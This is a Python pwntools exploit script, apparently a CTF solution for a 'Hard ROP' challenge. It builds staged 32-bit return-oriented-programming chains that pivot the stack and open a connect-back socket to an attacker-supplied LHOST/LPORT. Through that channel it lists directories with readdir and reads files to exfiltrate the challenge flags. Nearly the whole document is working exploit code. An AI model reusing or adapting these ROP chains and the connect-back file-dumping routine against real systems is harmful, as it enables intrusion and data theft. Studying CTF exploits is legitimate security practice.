# CTF: playtesting for theKidOfAcrania
# Task: Hard ROP
# Exploit-By: braindead <braindeaded@protonmail.com>

from pwn import *
import gadgets as g
import linux
from collections import defaultdict, namedtuple
import shlex

sc = linux.syscalls(mode='_32')

deflabel = namedtuple('deflabel', ['name'])
pad_to = namedtuple('pad_to', ['addr'])
LABELS = {}
class L:
	def __getattr__(self, x):
		global L
		return LABELS[x]
L = L()

def pad(n=4): return ("Lain"*((n+3)/4))[-n:]

rop_i = 0
def pack(xs, maxlen=100):
	global LABELS
	pos = 0
	for x in xs:
		if isinstance(x, deflabel):
			LABELS[x.name] = pos
			#print('label %s = 0x%03x'%(x.name, pos))
		elif isinstance(x, pad_to):
			assert pos <= x.addr
			pos = x.addr
		elif isinstance(x, int):
			pos += 4
		elif callable(x):
			pos += 4
		else:
			pos += len(x)
	b = ''
	for x in xs:
		if isinstance(x, deflabel):
			assert len(b) == LABELS[x.name]
			continue
		if isinstance(x, pad_to):
			assert x.addr >= len(b)
			x = pad(x.addr - len(b))
		elif callable(x):
			LABELS['here'] = len(b)
			x = x()
		if isinstance(x, int):
			x = p32(x)
		b += x
	global rop_i
	rop_i += 1
	with open('rop%i.bin'%rop_i, 'wb') as f:
		f.write(b)
	if len(b) > maxlen:
		warn('ropchain too long (%i)'%len(b))
	return b

VULN = 0x0804891f
PUSH_ESP_CALL_EDI = 0x0807883e # push esp ; call edi ;
SOCKADDR = 0x00002078 + 0x080d8000
SCRATCH = 0x080d8000

TCP_PARAMS = 0x080d9c18
UDP_PARAMS = 0x080d9ec0

LHOST = list(map(int, args.LHOST.split('.')))
LPORT = int(args.LPORT)
LHOST = u32(''.join(map(chr, LHOST)))
LPORT = (LPORT&0xFF)*0x100 + (LPORT>>8)

ADD_EAX_EDX = 0x08068263 # add eax, edx ; ret  ;
SUB_EAX_0X10_POP_EDI = 0x08091bd8 # sub eax, 0x10 ; pop edi ; ret  ;
SUB_EDX_0X10_POP_EDI = 0x0806791b # sub edx, 0x10 ; jb 0x80679f0 ; lea eax, [edi + 0xf] ; pop edi ; ret  ;

MOVSD = 0x080c0e91 # movsd dword ptr es:[edi], dword ptr [esi] ; ret  ;

SHITTY_WRITE = 0x080a8f2b # add dword ptr [edx + 1], ebp ; call eax ;

SOCKETCALL = 0x0806f049 # useless due to canary

VSYSCALL_POP_EBX = 0x0806cdbe

ADDR_OF_MINUS_36 = 0x080abd1a
READ_WITH_SIZE = 0x0804892a

rop = pack([
# 5 free slots:
	g.POP_ECX_EBX, SOCKADDR, 3, # SYS_CONNECT
	g.VSYSCALL,
	VULN,

pad_to(20),
	g.POP_EDI, g.POP_EBX_EBP_ESI_EDI,
	PUSH_ESP_CALL_EDI,
# struct sockaddr_in (also popped into ESI and EDI)
	p16(2), p16(LPORT), LHOST,
	g.POP_EAX_EDX_EBX, g.POP_EDX_ECX_EBX, SOCKADDR+4-1, pad(),
	SHITTY_WRITE,  # -> pop ecx; pop ebx

# socket(AF_INET, SOCK_STREAM, 0) -> 0
	TCP_PARAMS, 1, # SYS_SOCKET
	g.POP_EAX, sc.socketcall,
	VSYSCALL_POP_EBX,

	ADDR_OF_MINUS_36-10,
	g.ADD_EBP_DWORD_PTR_EBX_0XA_,
# now ebp points to start of buffer
# 2 free slots:
	g.POP_EAX, sc.socketcall,
# pivot to ebp
	g.LEAVE
])
info('rop size: %d/100'%len(rop))

rop2 = pack([
	'ROP2',
pad_to(16), (-16)&0xffffffff,
	g.POP_EAX, sc.socketcall,
	g.POP_EDX_EBX, # to skip sockaddr
	p16(2), p16(LPORT), LHOST,
	g.POP_ECX_EBX, TCP_PARAMS, 1, # SYS_SOCKET
	g.VSYSCALL,

	g.POP_EAX, sc.socketcall,
	g.POP_ECX_EBX, SOCKADDR, 3, # SYS_CONNECT
	g.VSYSCALL,

	# restore ebp
	g.POP_ESI, SOCKADDR+4-10,
	g.ADD_EBP_DWORD_PTR_ESI_0XA_,

	READ_WITH_SIZE, 0x10000,
pad_to(100),
])
info('rop2 size: %d/100'%len(rop2))

base = './flag_dir'
if args.LOCAL:
	r = remote('127.0.0.1', 8888)
elif args.RHOST:
	base = '/flag_dir'
	#r = remote('172.17.0.2', 1337)
	r = remote(args.RHOST, args.RPORT)
	pass
else:
	p = process(['strace']+shlex.split(args.STRACE)+['-o', 'trace', '-f', './blacklist']); r = p

l = listen(int(args.LPORT))
r.send(rop)
info('sent stage 1')
r = l.wait_for_connection()

l = listen(int(args.LPORT))
r.send(rop2)
info('sent stage 2')
r = l.wait_for_connection()

INT80 = 0x806fa30

rop_state = 0
def exec_rop(tag, text, data=[]):
	global rop_state
	rop_state ^= 1
	rop3 = pack(
	[
		tag,
	pad_to(0x34 - 40),
	deflabel('loader'),
		g.POP_EBP, SOCKADDR+4-2,
		g.POP_EAX, sc.read,
		g.POP_EDX_ECX_EBX, 0x10000, (-32)&0xffffffff, 0,
		g.ADD_ECX_DWORD_PTR_EBP_2_, # ecx = &rop
		INT80,
	]
		+ #([g.RET, g.VSYSCALL] if rop_state == 1 else [g.VSYSCALL, g.RET]) +
	[
		pad_to(0x34)
	]
		+ text +
	[
		# pivot esp to the loader in front for the payload
		g.POP_ECX_EBX, lambda: (L.loader-32)&0xffffffff, 0,
		g.POP_EBP, SOCKADDR+4-2,
		g.ADD_ECX_DWORD_PTR_EBP_2_, # ecx = &rop
		g.MOV_ESP_ECX,
	]
		+ data +
	[
	], maxlen=0x10000)
	#info('sending %d byte %s payload'%(len(rop3), tag))
	r.send(rop3)

def list_dir(dir_path):
	info('listing '+repr(dir_path))
	exec_rop('OPENDIR',
		text = [
			g.POP_EAX, sc.open,
			g.POP_EDX_ECX_EBX, 0, 0, lambda: L.path - 32,
			g.POP_ESI, SOCKADDR+4-10,
			g.POP_EBP, 0,
			g.ADD_EBP_DWORD_PTR_ESI_0XA_, # ebp = &sin
			g.ADD_EBX_EBP, # ebx = &path
			INT80,

			g.POP_EDX_ECX_EBX, 1, lambda: (L.path-32)&0xffffffff, 0,
			g.POP_EBP, SOCKADDR+4-2,
			g.ADD_ECX_DWORD_PTR_EBP_2_, # ecx = &buffer
			g.POP_EAX, sc.write,
			g.VSYSCALL,
		],
		data = [
			deflabel('path'),
				dir_path, '\x00',
		]
	)
	r.recv(1) # sync to prevent tcp merging
	entries = []
	prev_name = None
	while True:
		exec_rop('READDIR',
			text = [
				# readdir(1, &buffer, 1)
				g.POP_EDX_ECX_EBX, 1, lambda: (L.buffer-32)&0xffffffff, 1,
				g.POP_EBP, SOCKADDR+4-2,
				g.ADD_ECX_DWORD_PTR_EBP_2_, # ecx = &buffer
				g.POP_EAX, sc.readdir,
				g.VSYSCALL,

				# write(0, &buffer, 262)
				g.POP_EDX_ECX_EBX, 266, lambda: (L.buffer-32)&0xffffffff, 0,
				g.POP_EBP, SOCKADDR+4-2,
				g.ADD_ECX_DWORD_PTR_EBP_2_, # ecx = &buffer
				g.POP_EAX, sc.write,
				g.VSYSCALL,
			],
			data = [
				deflabel('buffer'),
			]
		)
		dirent = r.recv(266)
		name = dirent[10:10+u16(dirent[8:10])]
		if name == prev_name:
			break
		prev_name = name
		entries.append(name)
		#success('entry %s'%repr(name))
	exec_rop('CLOSE',
		text = [
			g.POP_EAX, sc.close,
			g.POP_EBX, 1,
			INT80,
		],
	)
	return entries

def get_file(path):
	exec_rop('READ',
		text = [
			# open(path, 0, 0) => 1
			g.POP_EAX, sc.open,
			g.POP_EDX_ECX_EBX, 0, 0, lambda: L.path - 32,
			g.POP_ESI, SOCKADDR+4-10,
			g.POP_EBP, 0,
			g.ADD_EBP_DWORD_PTR_ESI_0XA_, # ebp = &sin
			g.ADD_EBX_EBP, # ebx = &path
			INT80,

			# read(1, &buffer, 64)
			g.POP_EDX_ECX_EBX, 64, lambda: (L.buffer-32)&0xffffffff, 1,
			g.POP_EBP, SOCKADDR+4-2,
			g.ADD_ECX_DWORD_PTR_EBP_2_, # ecx = &buffer
			g.POP_EAX, sc.read,
			INT80,

			# edx = eax
			g.POP_EDX, g.POP_EBX_EDX,
			g.PUSH_EAX_CALL_EDX, 

			# write(0, &buffer, n)
			g.POP_ECX_EBX, lambda: (L.buffer-32)&0xffffffff, 0,
			g.POP_EBP, SOCKADDR+4-2,
			g.ADD_ECX_DWORD_PTR_EBP_2_, # ecx = &buffer
			g.POP_EAX, sc.write,
			INT80,

			# close(1)
			g.POP_EAX, sc.close,
			g.POP_EBX, 1,
			INT80,
		],
		data = [
			deflabel('path'),
			deflabel('buffer'),
				path, '\x00',
		]
	)

	return r.recvline()

dir0 = list_dir(base)
files = []
for x in dir0:
	if x in ['.', '..']: continue
	dir1 = list_dir(base+'/'+x)
	for y in dir1:
		if y in ['.', '..']: continue
		dir2 = list_dir(base+'/'+x+'/'+y)
		for z in dir2:
			if z in ['.', '..']: continue
			files.append(base+'/'+x+'/'+y+'/'+z)

success('got %i files'%len(files))

flags_sink = open('flags.txt', 'w')
flags = []
info("dumping flags to flags.txt")
for  f in files:
	x = get_file(f)
	flags_sink.write(x)
	flags.append(x)
for f in flags:
	if '{' in f:
		success('FLAG: '+repr(f))

exec_rop('EXIT', [ g.POP_EAX, sc.exit, g.POP_EBX, 0, INT80 ])

r.close()

#p.wait()
